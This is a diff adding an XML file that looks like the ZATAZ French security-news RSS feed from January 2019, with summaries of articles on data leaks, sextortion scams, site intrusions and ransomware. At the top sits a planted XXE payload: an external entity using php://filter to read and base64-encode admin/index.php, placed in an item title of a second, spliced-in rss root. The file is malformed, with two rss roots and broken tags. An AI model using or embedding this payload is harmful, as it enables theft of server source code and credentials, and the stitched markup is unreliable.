@@ -1,0 +1,283 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" media="screen" href="/~d/styles/rss2frenchfull.xsl"?><?xml-stylesheet type="text/css" media="screen" href="http://feeds.feedburner.com/~d/styles/itemcontent.css"?><rss xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0" version="2.0">
+<!DOCTYPE root[
+    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=admin/index.php">
+]>
+<rss xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" version="2.0">
+    <channel>
+        <title>Categories actualiteSupelec Com</title>
+        <item>
+            <title>&xxe;</title>
+        </item>
+    </channel>
+</rss>
+
+<channel>
+	<title>ZATAZ</title>
+	
+	<link>https://www.zataz.com</link>
+	<description>S'informer, c'est déjà se sécuriser</description>
+	<lastBuildDate>Thu, 31 Jan 2019 15:15:42 +0000</lastBuildDate>
+	<language>fr-FR</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.0.3</generator>
+
+<image>
+	<url>https://www.zataz.com/wp-content/uploads/cropped-512-32x32.png</url>
+	<title>ZATAZ</title>
+	<link>https://www.zataz.com</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="self" type="application/rss+xml" href="http://feeds.feedburner.com/ZatazNews" /><feedburner:info uri="zataznews" /><atom10:link xmlns:atom10="http://www.w3.org/2005/Atom" rel="hub" href="http://pubsubhubbub.appspot.com/" /><feedburner:emailServiceId>ZatazNews</feedburner:emailServiceId><feedburner:feedburnerHostname>https://feedburner.google.com</feedburner:feedburnerHostname><feedburner:feedFlare href="http://www.newsgator.com/ngs/subscriber/subext.aspx?url=http%3A%2F%2Ffeeds.feedburner.com%2FZatazNews" src="http://www.newsgator.com/images/ngsub1.gif">Subscribe with NewsGator</feedburner:feedFlare><feedburner:feedFlare href="http://www.bloglines.com/sub/http://feeds.feedburner.com/ZatazNews" src="http://www.bloglines.com/images/sub_modern11.gif">Subscribe with Bloglines</feedburner:feedFlare><feedburner:feedFlare href="http://www.netvibes.com/subscribe.php?url=http%3A%2F%2Ffeeds.feedburner.com%2FZatazNews" src="//www.netvibes.com/img/add2netvibes.gif">Subscribe with Netvibes</feedburner:feedFlare><feedburner:feedFlare href="http://fusion.google.com/add?feedurl=http%3A%2F%2Ffeeds.feedburner.com%2FZatazNews" src="http://buttons.googlesyndication.com/fusion/add.gif">Subscribe with Google</feedburner:feedFlare><feedburner:feedFlare href="http://www.pageflakes.com/subscribe.aspx?url=http%3A%2F%2Ffeeds.feedburner.com%2FZatazNews" src="http://www.pageflakes.com/ImageFile.ashx?instanceId=Static_4&amp;fileName=ATP_blu_91x17.gif">Subscribe with Pageflakes</feedburner:feedFlare><feedburner:feedFlare href="https://add.my.yahoo.com/content?lg=fr&amp;url=http%3A%2F%2Ffeeds.feedburner.com%2FZatazNews" src="http://us.i1.yimg.com/us.yimg.com/i/us/my/bn/intatm_fr_1.gif">Subscribe with Mon Yahoo!</feedburner:feedFlare><item>
+		<title>1er février : journée internationale du changement de mots de passe</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/jOD2Q-GXUc8/</link>
+		<comments>https://www.zataz.com/1er-fevrier-journee-internationale-du-changement-de-mots-de-passe/#comments</comments>
+		<pubDate>Thu, 31 Jan 2019 09:40:10 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Espionnage]]></category>
+		<category><![CDATA[filoutage]]></category>
+		<category><![CDATA[hameçonnage]]></category>
+		<category><![CDATA[Phishing]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Vie privée]]></category>
+		<category><![CDATA[journée]]></category>
+		<category><![CDATA[mot de passe]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19791</guid>
+		<description>&lt;p&gt;Voilà une idée originale, la journée du changement du mot de passe. C&amp;#8217;est sous l&amp;#8217;impulsion de Gizmodo que cette proposition a été lancée à l&amp;#8217;échelle mondiale. ZATAZ y participe et vous propose de savoir si vous êtes dans les 32 millions de données piratées découvertes cette semaine...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/1er-fevrier-journee-internationale-du-changement-de-mots-de-passe/"&gt;1er février : journée internationale du changement de mots de passe&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/jOD2Q-GXUc8" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/1er-fevrier-journee-internationale-du-changement-de-mots-de-passe/feed/</wfw:commentRss>
+		<slash:comments>4</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/1er-fevrier-journee-internationale-du-changement-de-mots-de-passe/</feedburner:origLink></item>
+		<item>
+		<title>Fin du business pirate pour XDedic Marketplace</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/VtybnmZJpwQ/</link>
+		<comments>https://www.zataz.com/fin-du-business-pirate-pour-xdedic-marketplace/#respond</comments>
+		<pubDate>Wed, 30 Jan 2019 00:38:18 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[bot]]></category>
+		<category><![CDATA[Botnet]]></category>
+		<category><![CDATA[Codes malveillants]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Justice]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19784</guid>
+		<description>&lt;p&gt;Le black market XDedic fermé par les autorités américaines avec l&amp;#8217;aide de l&amp;#8217;Ukraine et de la Belgique. La police américaine a mis le paquet pour faire fermer le black market XDedic. Avec l&amp;#8217;aide de la police Allemande, Ukrainienne et Belge, XDedic se retrouve dans les mains des auto...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/fin-du-business-pirate-pour-xdedic-marketplace/"&gt;Fin du business pirate pour XDedic Marketplace&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/VtybnmZJpwQ" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/fin-du-business-pirate-pour-xdedic-marketplace/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/fin-du-business-pirate-pour-xdedic-marketplace/</feedburner:origLink></item>
+		<item>
+		<title>Business des bases de données piratées : ZATAZ met la main sur plus de 32 millions de Français</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/YIXUWqtBhPM/</link>
+		<comments>https://www.zataz.com/business-des-bases-de-donnees-piratees-zataz-met-la-main-sur-plus-de-32-millions-de-francais/#comments</comments>
+		<pubDate>Tue, 29 Jan 2019 23:48:23 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[chantage numérique]]></category>
+		<category><![CDATA[Chiffrement]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Escroquerie]]></category>
+		<category><![CDATA[Espionnage]]></category>
+		<category><![CDATA[filoutage]]></category>
+		<category><![CDATA[Fuite de données]]></category>
+		<category><![CDATA[hameçonnage]]></category>
+		<category><![CDATA[infiltration]]></category>
+		<category><![CDATA[Intrusion]]></category>
+		<category><![CDATA[Phishing]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Sécurité]]></category>
+		<category><![CDATA[Vie privée]]></category>
+		<category><![CDATA[adulte]]></category>
+		<category><![CDATA[chantage]]></category>
+		<category><![CDATA[escroc]]></category>
+		<category><![CDATA[mail]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[porno]]></category>
+		<category><![CDATA[site]]></category>
+		<category><![CDATA[Vous avez 48 heures pour effectuer le paiement]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19774</guid>
+		<description>&lt;p&gt;« Vous avez 48 heures pour effectuer le paiement. » Voilà le type de menace que reçoivent, depuis plusieurs jours, des centaines de milliers de personnes, par courrier électronique. Une nouvelle tentative de chantage lancée par des escrocs. Il ne s&amp;#8217;agit pas de pirates derrière ces lettres élec...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/business-des-bases-de-donnees-piratees-zataz-met-la-main-sur-plus-de-32-millions-de-francais/"&gt;Business des bases de données piratées : ZATAZ met la main sur plus de 32 millions de Français&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/YIXUWqtBhPM" height="1" width="1" alt=""/&gt;</description>
+		<wfw:comment
+>https://www.zataz.com/business-des-bases-de-donnees-piratees-zataz-met-la-main-sur-plus-de-32-millions-de-francais/feed/</wfw:commentRss>
+		<slash:comments>9</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/business-des-bases-de-donnees-piratees-zataz-met-la-main-sur-plus-de-32-millions-de-francais/</feedburner:origLink></item>
+		<item>
+		<title>Chantage par mail : +1100 versions de l’escroquerie « je t’ai vu te masturber »</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/Jt33lhE7ZaM/</link>
+		<comments>https://www.zataz.com/chantage-par-mail-1100-versions-de-lescroquerie-je-tai-vu-te-masturber/#comments</comments>
+		<pubDate>Sun, 27 Jan 2019 23:15:12 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[chantage numérique]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Monnaie virtuelle]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[RGPD]]></category>
+		<category><![CDATA[chantage]]></category>
+		<category><![CDATA[escroquerie]]></category>
+		<category><![CDATA[mail]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19763</guid>
+		<description>&lt;p&gt;Chantage par mail ! Depuis plus de 30 ans que je virevolte dans la cybersécurité, je n&amp;#8217;ai jamais vue une telle ampleur concernant une attaque informatique. L&amp;#8217;arnaque par mail « Je t&amp;#8217;ai vu te masturber » vient de dépasser sa 1 100ème version. De l&amp;#8217;extorsion 2.0 ! Pas de doute,...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/chantage-par-mail-1100-versions-de-lescroquerie-je-tai-vu-te-masturber/"&gt;Chantage par mail : +1100 versions de l&amp;rsquo;escroquerie « je t&amp;rsquo;ai vu te masturber »&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/Jt33lhE7ZaM" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/chantage-par-mail-1100-versions-de-lescroquerie-je-tai-vu-te-masturber/feed/</wfw:commentRss>
+		<slash:comments>30</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/chantage-par-mail-1100-versions-de-lescroquerie-je-tai-vu-te-masturber/</feedburner:origLink></item>
+		<item>
+		<title>La fuite des 900 millions de données piratées… une vengeance entre pirates</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/jTuyr1aCRyE/</link>
+		<comments>https://www.zataz.com/la-fuite-des-900-millions-de-donnees-piratees-une-vengeance-entre-pirates/#respond</comments>
+		<pubDate>Sun, 20 Jan 2019 23:57:44 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[chantage numérique]]></category>
+		<category><![CDATA[Chiffrement]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Espionnage]]></category>
+		<category><![CDATA[filoutage]]></category>
+		<category><![CDATA[hameçonnage]]></category>
+		<category><![CDATA[infiltration]]></category>
+		<category><![CDATA[Internet of Things]]></category>
+		<category><![CDATA[Intrusion]]></category>
+		<category><![CDATA[Phishing]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Protocole alerte]]></category>
+		<category><![CDATA[RGPD]]></category>
+		<category><![CDATA[Sécurité]]></category>
+		<category><![CDATA[Technologie]]></category>
+		<category><![CDATA[Vie privée]]></category>
+		<category><![CDATA[data leak]]></category>
+		<category><![CDATA[fuite]]></category>
+		<category><![CDATA[identité]]></category>
+		<category><![CDATA[numérique]]></category>
+		<category><![CDATA[réputation]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19751</guid>
+		<description>&lt;p&gt;Un énorme dossier de 900 millions de données piratées diffusés sur Internet. Une vengeance sauce black market. Il existe encore 2 collections dans les mains des pirates. Vous avez lu dans la presse qu&amp;#8217;une énorme base de données de logins, mots de passe, mails &amp;#8230; avait été retrouvée sur In...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/la-fuite-des-900-millions-de-donnees-piratees-une-vengeance-entre-pirates/"&gt;La fuite des 900 millions de données piratées&amp;#8230; une vengeance entre pirates&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/jTuyr1aCRyE" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/la-fuite-des-900-millions-de-donnees-piratees-une-vengeance-entre-pirates/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/la-fuite-des-900-millions-de-donnees-piratees-une-vengeance-entre-pirates/</feedburner:origLink></item>
+		<item>
+		<title>Infiltration : Redirection malveillante pour l’école Boulle</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/JxOXxWBx3uU/</link>
+		<comments>https://www.zataz.com/infiltration-redirection-malveillante-pour-lecole-boulle/#respond</comments>
+		<pubDate>Sun, 20 Jan 2019 21:13:51 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[Codes malveillants]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[infiltration]]></category>
+		<category><![CDATA[Navigateur sécurisé]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Sécurité]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[site web]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19746</guid>
+		<description>&lt;p&gt;Infiltration &amp;#8211; La prestigieuse école publique Boulle redirige ses visiteurs vers des espaces malveillants. Infiltration &amp;#8211; Le piratage informatique peut prendre de nombreuses formes. L&amp;#8217;une d&amp;#8217;elle est de diffuser des publicités malveillantes comme ont pu le vivre plus de 200 si...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/infiltration-redirection-malveillante-pour-lecole-boulle/"&gt;Infiltration : Redirection malveillante pour l&amp;rsquo;école Boulle&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/JxOXxWBx3uU" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/infiltration-redirection-malveillante-pour-lecole-boulle/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/infiltration-redirection-malveillante-pour-lecole-boulle/</feedburner:origLink></item>
+		<item>
+		<title>Le site web de la Bibliothèque du Vatican infiltré par des pirates</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/c3J244WEGtU/</link>
+		<comments>https://www.zataz.com/le-site-web-de-la-bibliotheque-du-vatican-infiltre-par-des-pirates/#respond</comments>
+		<pubDate>Sun, 20 Jan 2019 20:51:01 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[Defacement]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Fuite de données]]></category>
+		<category><![CDATA[infiltration]]></category>
+		<category><![CDATA[Intrusion]]></category>
+		<category><![CDATA[Piratage]]></category>
+		<category><![CDATA[Sécurité]]></category>
+		<category><![CDATA[1937CN]]></category>
+		<category><![CDATA[hacked]]></category>
+		<category><![CDATA[piratage]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19742</guid>
+		<description>&lt;p&gt;Les voix du serveur sont impénétrables ? Le site de la bibliothèque du Vatican infiltré par de nombreux pirates. Site web infiltré depuis plus de 4 ans ! Ambiance fête de fin d&amp;#8217;année dans le serveur de la bibliothèque du Vatican. ZATAZ a pu constater que de nombreux pirates avaient pris pour e...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/le-site-web-de-la-bibliotheque-du-vatican-infiltre-par-des-pirates/"&gt;Le site web de la Bibliothèque du Vatican infiltré par des pirates&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/c3J244WEGtU" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/le-site-web-de-la-bibliotheque-du-vatican-infiltre-par-des-pirates/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/le-site-web-de-la-bibliotheque-du-vatican-infiltre-par-des-pirates/</feedburner:origLink></item>
+		<item>
+		<title>Attaque bancaire à l’encontre de plusieurs boutiques Françaises</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/PmDQA_xURTo/</link>
+		<comments>https://www.zataz.com/attaque-bancaire-a-lencontre-de-plusieurs-boutiques-francaises/#comments</comments>
+		<pubDate>Sun, 20 Jan 2019 17:34:16 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[Divers]]></category>
+		<category><![CDATA[Piratage]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19731</guid>
+		<description>&lt;p&gt;Début janvier, des chercheurs en cybersécurité découvrent l&amp;#8217;infiltration de la régie publicitaire française Adverline. Les pirates diffusent des annonces piégées via 227 sites web. L&amp;#8217;attaque n&amp;#8217;est pas nouvelle, elle fait même les choux gras de nombreux pirates informatiques. Le spé...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/attaque-bancaire-a-lencontre-de-plusieurs-boutiques-francaises/"&gt;Attaque bancaire à l&amp;rsquo;encontre de plusieurs boutiques Françaises&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/PmDQA_xURTo" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/attaque-bancaire-a-lencontre-de-plusieurs-boutiques-francaises/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/attaque-bancaire-a-lencontre-de-plusieurs-boutiques-francaises/</feedburner:origLink></item>
+		<item>
+		<title>Double effet malveillant pour un ransomware : il prend du bitcoin et vole votre Paypal</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/p-tvtf1Bxek/</link>
+		<comments>https://www.zataz.com/double-effet-malveillant-pour-un-ransomware-il-prend-du-bitcoin-et-vole-votre-paypal/#respond</comments>
+		<pubDate>Sun, 20 Jan 2019 12:40:57 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[banque]]></category>
+		<category><![CDATA[bot]]></category>
+		<category><![CDATA[Botnet]]></category>
+		<category><![CDATA[Chiffrement]]></category>
+		<category><![CDATA[Codes malveillants]]></category>
+		<category><![CDATA[cryptolocker]]></category>
+		<category><![CDATA[filoutage]]></category>
+		<category><![CDATA[Fuite de données]]></category>
+		<category><![CDATA[hameçonnage]]></category>
+		<category><![CDATA[infiltration]]></category>
+		<category><![CDATA[Phishing]]></category>
+		<category><![CDATA[Sécurité]]></category>
+		<category><![CDATA[Vie privée]]></category>
+		<category><![CDATA[Windows]]></category>
+		<category><![CDATA[phishing]]></category>
+		<category><![CDATA[ransomware]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19724</guid>
+		<description>&lt;p&gt;Un ransomware chiffre les fichiers de votre ordinateur, réclame une rançon en bitcoin et tente de voler l&amp;#8217;accès à votre compte Paypal via une page phishing. Ce qui est intéressant avec les pirates, leur imagination « no limit ». Dernier cas en date, un ransomware qui prend vos bitcoins et tent...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/double-effet-malveillant-pour-un-ransomware-il-prend-du-bitcoin-et-vole-votre-paypal/"&gt;Double effet malveillant pour un ransomware : il prend du bitcoin et vole votre Paypal&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/p-tvtf1Bxek" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/double-effet-malveillant-pour-un-ransomware-il-prend-du-bitcoin-et-vole-votre-paypal/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/double-effet-malveillant-pour-un-ransomware-il-prend-du-bitcoin-et-vole-votre-paypal/</feedburner:origLink></item>
+		<item>
+		<title>Durant plus de 4 ans, un bug sur Twitter Android permettait de lire les messages privés</title>
+		<link>http://feedproxy.google.com/~r/ZatazNews/~3/9IzEB5DBnXg/</link>
+		<comments>https://www.zataz.com/durant-plus-de-4-ans-un-bug-sur-twitter-android-permettait-de-lire-les-messages-prives/#respond</comments>
+		<pubDate>Sun, 20 Jan 2019 12:15:51 +0000</pubDate>
+		<dc:creator><![CDATA[Damien Bancal]]></dc:creator>
+				<category><![CDATA[Actualités]]></category>
+		<category><![CDATA[bug]]></category>
+		<category><![CDATA[faille]]></category>
+		<category><![CDATA[fuite]]></category>
+		<category><![CDATA[messages privé]]></category>
+		<category><![CDATA[Twitter]]></category>
+
+		<guid isPermaLink="false">http://www.zataz.com/?p=19719</guid>
+		<description>&lt;p&gt;Une faille dans l&amp;#8217;application Android Twitter expose les tweets confidentiels des utilisateurs durant plus de 4 ans ! Les joies de l&amp;#8217;informatique et de ses bugs. Durant plusieurs années, un bug visant l&amp;#8217;application Android de Twitter permettait d&amp;#8217;accéder sans limitation aux m...&lt;/p&gt;
+&lt;p&gt;Cet article &lt;a rel="nofollow" href="https://www.zataz.com/durant-plus-de-4-ans-un-bug-sur-twitter-android-permettait-de-lire-les-messages-prives/"&gt;Durant plus de 4 ans, un bug sur Twitter Android permettait de lire les messages privés&lt;/a&gt; est apparu en premier sur &lt;a rel="nofollow" href="https://www.zataz.com"&gt;ZATAZ&lt;/a&gt;.&lt;/p&gt;&lt;img src="http://feeds.feedburner.com/~r/ZatazNews/~4/9IzEB5DBnXg" height="1" width="1" alt=""/&gt;</description>
+		<wfw:commentRss>https://www.zataz.com/durant-plus-de-4-ans-un-bug-sur-twitter-android-permettait-de-lire-les-messages-prives/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		<feedburner:origLink>https://www.zataz.com/durant-plus-de-4-ans-un-bug-sur-twitter-android-permettait-de-lire-les-messages-prives/</feedburner:origLink></item>
+	</channel>
+</rss>
